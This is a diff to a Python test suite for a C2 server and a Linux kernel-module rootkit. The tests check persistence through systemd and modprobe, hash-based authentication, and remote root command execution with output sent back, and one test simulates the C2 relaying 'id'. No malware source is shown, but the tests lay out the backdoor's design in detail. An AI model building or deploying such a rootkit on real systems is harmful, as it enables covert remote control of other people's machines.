@@ -49,6 +49,7 @@ def wait_for_line(proc, needle, timeout=3.0):
 
 
 def test_c2_builds():
+    """Compile le C2 avec make et vérifie que le binaire attacking_program/c2 est produit."""
     result = run(["make", "-C", str(C2_DIR)])
     if result.returncode != 0:
         fail("c2 builds", result.stderr or result.stdout)
@@ -58,6 +59,7 @@ def test_c2_builds():
 
 
 def test_c2_requires_port_and_password():
+    """Vérifie que le C2 refuse de démarrer sans les arguments <port> et <password>."""
     result = run([str(C2_BIN)])
     if result.returncode == 0:
         fail("c2 rejects missing args", "c2 succeeded without <port> <password>")
@@ -75,6 +77,7 @@ def fnv1a_hash(text):
 
 
 def test_c2_sends_auth_hash():
+    """Lance le C2, se connecte en TCP et vérifie que la première trame reçue est AUTH <hash_fnv1a>."""
     port = free_port()
     password = "secret-test"
     proc = subprocess.Popen(
@@ -106,6 +109,7 @@ def require_source(pattern, description, source, test_name):
 
 
 def test_rootkit_makefile_compile_feature():
+    """Vérifie que rootkit/Makefile déclare wlkom.o comme LKM et délègue au build system kernel."""
     source = ROOTKIT_MAKEFILE.read_text()
     checks = [
         ("KERNELDIR = /lib/modules/$(shell uname -r)/build", "kernel headers build directory"),
@@ -120,6 +124,7 @@ def test_rootkit_makefile_compile_feature():
 
 
 def test_wlkom_connection_source():
+    """Vérifie dans wlkom.c la présence du kthread, du socket TCP kernel, du retry interruptible et du shutdown propre."""
     source = WLKOM_C.read_text()
     checks = [
         ("static char *c2_ip", "configurable C2 IP module parameter"),
@@ -142,6 +147,7 @@ def test_wlkom_connection_source():
 
 
 def test_persistence_installer_source():
+    """Vérifie dans install_persistence.sh la présence du service systemd, de modprobe et du hash calculé en interactif."""
     source = PERSISTENCE_SCRIPT.read_text()
     checks = [
         ("Usage: sudo $0 [c2_ip] [c2_port]", "documented installer arguments"),
@@ -164,6 +170,7 @@ def test_persistence_installer_source():
 
 
 def test_c2_fnv1a_source():
+    """Vérifie dans c2.c que le hash FNV-1a est correctement implémenté (offset, prime, xor, multiply)."""
     source = (C2_DIR / "c2.c").read_text()
     checks = [
         ("#define FNV1A_OFFSET 2166136261U", "FNV-1a offset basis"),
@@ -179,6 +186,7 @@ def test_c2_fnv1a_source():
 
 
 def test_wlkom_password_auth_source():
+    """Vérifie dans wlkom.c que le hash est un module_param non hardcodé et que l'authentification AUTH est correcte."""
     source = WLKOM_C.read_text()
     checks = [
         ('module_param(password_hash, charp, 0400);', "non-hardcoded password hash module parameter"),
@@ -195,6 +203,91 @@ def test_wlkom_password_auth_source():
     ok("wlkom password/auth source checks")
 
 
+def test_wlkom_exec_source():
+    """Vérifie dans wlkom.c la présence de call_usermodehelper, des fichiers tmp et des marqueurs du protocole de réponse."""
+    source = WLKOM_C.read_text()
+    checks = [
+        ("execute_and_send_output", "command execution helper"),
+        ("call_usermodehelper", "kernel usermode command execution"),
+        ("UMH_WAIT_PROC", "synchronous wait for child process"),
+        ("#define TMP_OUT_FILE", "stdout capture temp file macro"),
+        ("#define TMP_ERR_FILE", "stderr capture temp file macro"),
+        ("filp_open", "kernel file open to read output"),
+        ("kernel_read", "kernel file read to stream output"),
+        ("[Exit Status: %d]", "exit status line in response"),
+        ("--- STDOUT ---", "stdout section delimiter"),
+        ("--- STDERR ---", "stderr section delimiter"),
+        ("--- End of Output ---", "end-of-output sentinel"),
+    ]
+    for pattern, description in checks:
+        require_source(pattern, description, source, "wlkom exec feature source checks")
+    ok("wlkom exec feature source checks")
+
+
+def test_c2_exec_protocol():
+    """Lance le C2, simule le rootkit côté socket et vérifie que le C2 relaie la commande et accepte le format de réponse."""
+    port = free_port()
+    password = "test-exec"
+    expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
+
+    proc = subprocess.Popen(
+        [str(C2_BIN), str(port), password],
+        text=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        wait_for_line(proc, "C2 listening", timeout=3.0)
+
+        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            sock.settimeout(3.0)
+
+            auth_data = b""
+            while b"\n" not in auth_data:
+                auth_data += sock.recv(64)
+            if auth_data != expected_auth:
+                fail("c2 exec protocol", f"unexpected AUTH: {auth_data!r}")
+
+            time.sleep(0.2)
+
+            proc.stdin.write("id\n")
+            proc.stdin.flush()
+
+            cmd_data = b""
+            while b"\n" not in cmd_data:
+                cmd_data += sock.recv(64)
+            if cmd_data.strip() != b"id":
+                fail("c2 exec protocol", f"wrong command received: {cmd_data!r}")
+
+            response = (
+                "[Exit Status: 0]\n"
+                "--- STDOUT ---\n"
+                "uid=0(root)\n"
+                "--- STDERR ---\n"
+                "--- End of Output ---\n\n"
+            )
+            sock.sendall(response.encode())
+
+            time.sleep(0.2)
+            proc.stdin.write("exit\n")
+            proc.stdin.flush()
+
+        ok("c2 exec protocol")
+    finally:
+        proc.stdin.close()
+        proc.terminate()
+        try:
+            proc.wait(timeout=2.0)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=2.0)
+
+
+def cleanup():
+    run(["make", "-C", str(C2_DIR), "clean"])
+
+
 def main():
     tests = [
         test_c2_builds,
@@ -205,10 +298,15 @@ def main():
         test_c2_fnv1a_source,
         test_c2_sends_auth_hash,
         test_wlkom_password_auth_source,
+        test_wlkom_exec_source,
+        test_c2_exec_protocol,
     ]
-    for test in tests:
-        test()
-    print(f"[OK] {len(tests)} tests passed")
+    try:
+        for test in tests:
+            test()
+        print(f"[OK] {len(tests)} tests passed")
+    finally:
+        cleanup()
 
 
 if __name__ == "__main__":
